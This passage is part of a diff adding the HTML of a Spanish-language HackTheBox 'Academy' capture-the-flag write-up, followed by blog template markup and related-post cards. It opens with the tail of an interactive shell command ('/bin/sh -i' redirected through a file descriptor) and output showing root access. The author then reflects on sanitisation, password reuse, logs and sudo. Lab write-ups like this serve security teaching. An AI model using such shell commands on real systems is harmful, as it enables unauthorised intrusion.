+&gt; /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+</code></pre>
+
+<p>Listones, tenemos una Shell como <code>root</code> en el sistema, lo único que nos quedaría ver serian las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297flags.png" alt="297flags" /></p>
+
+<p>…</p>
+
+<p>Y hemos terminado, siendo <code>root</code> podemos hacer lo que queramos :P</p>
+
+<p>Linda máquina, muy didáctica, su nombre (academy) esta de acuerdo con lo que toma, nos recuerda la implementación de una buena sanitización HTML, el hacer un buen research con base en lo que tenemos (errores y rutas), enumeración de archivos, probar contraseñas que probablemente no “deban” estar relacionadas, pero que si tenemos en cuenta que somos personas muchas veces olvidadizas o perezosas, asignamos la misma contraseña para varios servicios…</p>
+
+<p>También nos muestra la importancia de los archivos <strong>log</strong> (y lo peligrosos) y finalmente el clásico, ver si podemos ejecutar algún recurso con <strong>permisos</strong> de administrador (:</p>
+
+<p>Linda máquina, muchas gracias por leer y como siempre, a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Academy&url=http://localhost:4000/htb/academy" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#adm">adm</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#deserialization">deserialization</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#logs">logs</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/knife">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/knife">HackTheBox - Knife</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
